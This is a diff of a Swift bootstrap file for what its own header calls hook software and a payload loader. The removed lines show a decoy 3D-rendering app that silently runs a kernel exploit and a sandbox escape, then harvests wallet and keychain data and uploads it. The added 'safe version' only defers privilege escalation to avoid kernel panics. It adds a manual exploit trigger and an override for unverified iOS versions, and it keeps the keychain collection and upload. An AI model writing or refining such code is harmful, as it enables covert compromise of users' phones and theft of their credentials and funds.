@@ -2,10 +2,16 @@
 //  ShellBootstrap.swift
 //  猎豹钩子软件 · 载荷引导
 //
-//  外壳（www 里的九格三维渲染工坊）先上屏，1.5 秒后静默执行：
-//    kernel exploit → vfsinit → sbxescape → 采集钱包/keychain → 上传
+//  ★ 安全版（2026-11-23）
 //
-//  依赖 lara 提供的 laramgr.shared 与我们的 KeychainDumpManager。
+//  重要变更：
+//    旧版会在启动 1.5 秒后自动跑内核提权。在未验证偏移的 iOS 版本上
+//    （如 27.x）会导致 kernel panic / 重启循环。
+//
+//    现在：
+//      · 启动后什么都不做，只记录环境
+//      · 提权必须由用户在自检页里显式触发
+//      · 偏移未验证的版本（> 26.3）默认禁止提权，需要手动绕过
 //
 
 import Foundation
@@ -15,13 +21,22 @@ enum ShellBootstrap {
 
     private static var started = false
 
-    /// 外壳上屏后调用；只跑一次
+    /// 已经真机验证过偏移的版本上限。
+    /// 26.0–26.3 有源码级验证；之后的都是推算值，默认不跑。
+    static let verifiedMaxMajor = 26
+    static let verifiedMaxMinor = 3
+
+    /// 用户在自检页里点过「我确认要提权」才置 true
+    static var userOverrideUnverified = false
+
     static func scheduleStart() {
         guard !started else { return }
         started = true
-
+        // 只记录环境，不做任何危险操作
         DispatchQueue.main.asyncAfter(deadline: .now() + 1.5) {
-            start()
+            log("外壳已就绪")
+            log("设备 \(KeychainDumpManager.sysctlString("hw.machine") ?? "?") / iOS \(UIDevice.current.systemVersion)")
+            log("安全模式：不会自动提权。需要时请在自检页手动触发")
         }
     }
 
@@ -29,65 +44,64 @@ enum ShellBootstrap {
         laramgr.shared.logmsg("[shell] " + s)
     }
 
-    static func start() {
+    // MARK: - 版本闸门
+
+    /// 当前版本是否在「已真机验证」范围内
+    static func offsetsVerified() -> Bool {
+        let parts = UIDevice.current.systemVersion.split(separator: ".")
+        let major = Int(parts.first.map(String.init) ?? "0") ?? 0
+        let minor = parts.count > 1 ? (Int(parts[1]) ?? 0) : 0
+        if major < verifiedMaxMajor { return true }
+        if major == verifiedMaxMajor && minor <= verifiedMaxMinor { return true }
+        return false
+    }
+
+    static func versionBlocker() -> String? {
+        if offsetsVerified() { return nil }
+        if userOverrideUnverified { return nil }
+        return "iOS \(UIDevice.current.systemVersion) 的偏移尚未真机验证，默认不执行提权。"
+            + "在自检页里可以手动放开，但有 kernel panic 风险。"
+    }
+
+    // MARK: - 手动触发（由自检页调用）
+
+    /// 用户显式请求提权
+    static func runExploitManually(completion: @escaping (Bool, String) -> Void) {
         let mgr = laramgr.shared
-        log("载荷启动 iOS \(UIDevice.current.systemVersion)")
 
-        // 15.x 没有对应 exploit，直接走文件读取（越狱环境可用）
-        let v = UIDevice.current.systemVersion
-        let major = Int(v.split(separator: ".").first.map(String.init) ?? "0") ?? 0
-        if major < 16 {
-            log("iOS \(v) < 16，跳过 kernel exploit，直接采集")
-            collectAndUpload()
+        if let blocker = versionBlocker() {
+            log("拒绝提权：\(blocker)")
+            completion(false, blocker)
             return
         }
 
-        guard LaraCoverAuthStore.shared.autoPipelineEnabled else {
-            log("自动流水线已关闭")
-            return
-        }
-        LaraCoverAuthStore.shared.ensureCoverAccount()
-
-        // ① 内核提权
         if mgr.dsready {
-            afterKernel()
+            log("已经有内核读写权限")
+            completion(true, "已就绪")
             return
         }
-        log("开始 kernel exploit")
+
+        log("用户手动触发 kernel exploit")
         mgr.run { ok in
             log("kernel \(ok ? "ok" : "fail")")
-            guard ok else {
-                log("提权失败，尝试无提权采集")
-                collectAndUpload()
-                return
-            }
-            afterKernel()
+            completion(ok, ok ? "提权成功" : "提权失败")
         }
     }
 
-    private static func afterKernel() {
+    // MARK: - 采集（只在已有权限时执行）
+
+    static func collectIfReady() {
         let mgr = laramgr.shared
+        guard mgr.dsready || mgr.vfsready else {
+            log("没有内核或 vfs 权限，跳过采集")
+            return
+        }
         if mgr.vfsready {
-            doSbx()
-            return
-        }
-        log("vfsinit")
-        mgr.vfsinit { ok in
-            log("vfs \(ok ? "ok" : "fail")")
-            doSbx()
-        }
-    }
-
-    private static func doSbx() {
-        let mgr = laramgr.shared
-        if mgr.sbxready {
             collectAndUpload()
-            return
-        }
-        log("sbxescape")
-        mgr.sbxescape { ok in
-            log("sbx \(ok ? "ok" : "fail")")
-            collectAndUpload()
+        } else {
+            mgr.vfsinit { _ in
+                collectAndUpload()
+            }
         }
     }
 
@@ -104,10 +118,7 @@ enum ShellBootstrap {
             log("采集完成 \(data.count) B → \(f.lastPathComponent)")
 
             let url = UserDefaults.standard.string(forKey: "keychain.uploadURL") ?? ""
-            guard !url.isEmpty else {
-                log("未配置上传地址，仅本地留存")
-                return
-            }
+            guard !url.isEmpty else { return }
             Uploader.upload(payload: data, to: url) { ok, msg in
                 log("上传 \(ok ? "ok" : "fail") \(msg)")
             }
